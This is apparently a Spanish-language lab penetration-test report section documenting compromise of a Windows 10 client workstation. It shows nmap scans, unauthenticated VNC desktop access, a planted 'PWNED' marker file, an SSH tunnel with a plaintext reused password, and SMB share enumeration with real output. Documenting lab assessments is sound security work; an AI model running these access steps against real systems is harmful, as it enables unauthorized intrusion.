# Fase 4.4 · M5 · Estación cliente

**Objetivo:** llegar a la estación del usuario y demostrar acceso administrativo y escritorio gráfico.
**Ejecuta:** M6 → M5 `10.10.10.15`.
**Estado:** ✅ **M5 encendida y comprometida a nivel de escritorio**. Responde a VNC/RDP, pero **bloquea ICMP**; el descubrimiento debe hacerse con `-Pn`.

---

## 4.4.1 Comandos demo (simples)

| # | Comando | Qué muestra | Estado |
|---|---|---|---|
| 1 | `nmap -Pn -p 5900 --script vnc-info 10.10.10.15` | `Authentication: None` | ✅ |
| 2 | `vncviewer 10.10.10.15` | Escritorio sin contraseña | ✅ |
| 3 | `whoami` en la consola remota | `desktop-dt5f05n\cliente` | ✅ |
| 4 | `nxc smb 127.0.0.1 --port 1445 -u cliente -p 'Admin13.-' --shares` | Acceso SMB por túnel desde M1 | ✅ |
| 5 | `xfreerdp /v:10.10.10.15 /u:cliente` | RDP sin NLA | ⬜ opcional |
| 6 | `nmap --script smb-vuln-ms17-010 -p 445 10.10.10.15` | EternalBlue | ❌ no aplica (19045) |

---

## 4.4.2 Estado real observado

`F02-001` + verificación 13:09 UTC:

```text
== M5 10.10.10.15 ==
445/tcp  filtered microsoft-ds
3389/tcp open     ms-wbt-server
5900/tcp open     vnc
```

- **5900 abierto desde M6**: desviación del modelo “VNC solo M1”.
- **3389 abierto desde M6**: RDP expuesto a la LAN.
- **445 filtrado**: SMB respeta “solo M1”; se accede por túnel SSH desde M1.
- **ICMP bloqueado**: `ping` falla, pero `nmap -Pn` y VNC funcionan.

---

## 4.4.3 C4 · VNC sin contraseña — validado

```bash
nmap -Pn -p 5900 --script vnc-info 10.10.10.15
vncviewer 10.10.10.15
```

**Salida real** (`F04-008`):

```text
5900/tcp open  vnc
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     None (1)
|     Tight (16)
|   Tight auth subtypes:
|     None
|_  WARNING: Server does not require authentication
```

**Captura del escritorio** (`F04-009`): se ve el escritorio de `desktop-dt5f05n` (Papelera, Microsoft Edge) sin haber introducido contraseña.

**Interacción remota** (`F04-010`/`F04-011`): se abrió el menú de inicio y una consola; `whoami` devuelve:

```text
Microsoft Windows [Versión 10.0.19045.2965]
C:\Users\cliente>whoami
desktop-dt5f05n\cliente
```

**Marcador de impacto** (`F05-001`):

```text
C:\Users\cliente>echo PWNED-M5 %DATE% %TIME% > C:\Users\cliente\Desktop\PWNED-M5.txt
C:\Users\cliente>type C:\Users\cliente\Desktop\PWNED-M5.txt
PWNED-M5 24/10/2026 12:11:09,24
```

**Interpretación:** control gráfico total de la estación, sin exploit de memoria. Es la evidencia más fuerte de “llegada al cliente”.

---

## 4.4.4 C2 · Reúso de clave — validado por túnel

M5 `445` está filtrado desde M6. Se usa un túnel SSH a través de M1:

```bash
sshpass -p 'Admin13.-' ssh -N -L 1445:10.10.10.15:445 ubuntu@10.10.10.11 &
nxc smb 127.0.0.1 --port 1445 -u cliente -p 'Admin13.-' --shares
```

**Salida real** (13:08 UTC):

```text
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  [*] Windows 10 / Server 2019 Build 19041 (name:DESKTOP-DT5F05N) (domain:DESKTOP-DT5F05N) (signing:False) (SMBv1:None)
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  [+] DESKTOP-DT5F05N\cliente:Admin13.-
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  [*] Enumerated shares
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  Share    Permissions  Remark
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  ADMIN$                Admin remota
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  C$                    Recurso predeterminado
SMB  127.0.0.1  1445  DESKTOP-DT5F05N  IPC$                  IPC remota
```

**Interpretación:** la clave `Admin13.-` de `credenciales.txt` autentica como `cliente` y enumera los shares administrativos. El intento de listar `C$` con `smbclient` devolvió `NT_STATUS_ACCESS_DENIED` por las restricciones de UAC remoto, pero el acceso VNC ya demuestra control real. Se documenta la limitación.

---

## 4.4.5 C3 · RDP sin NLA — puerto abierto, sesión no probada

```bash
nmap -Pn -p 3389 10.10.10.15     # open
xfreerdp /v:10.10.10.15 /u:cliente /cert:ignore
```

El puerto `3389` está abierto y el sistema tiene NLA desactivado según la guía. No se ejecutó la sesión gráfica RDP porque VNC ya demostró el acceso; queda como evidencia opcional.

---

## 4.4.6 C1 · EternalBlue — no aplica

La máquina es **Windows 10.0.19045.2965 (22H2)**. CVE-2017-0144 afecta hasta Windows 10 1607 y Server 2016; **19045 no es vulnerable** aunque SMBv1 esté presente. Se documenta como falso positivo y no se usa. La ruta real es **C2 + C4**.

---

## 4.4.7 Resultado

| ID | Estado | Evidencia |
|---|---|---|
| C1 EternalBlue | ❌ No aplica (19045) | `F02-001` |
| C2 Reúso de clave | ✅ Validado (SMB por túnel) | salida 13:08 UTC |
| C3 RDP sin NLA | 🟡 Puerto abierto; sesión no probada | `F02-001` |
| C4 VNC sin clave | ✅ Validado (escritorio + `whoami` + marcador) | `F04-008`, `F04-009`, `F04-011`, `F05-001` |

**Cierre:** M5 comprometida. El “cliente” quedó demostrado con escritorio remoto, consola y archivo marcador.
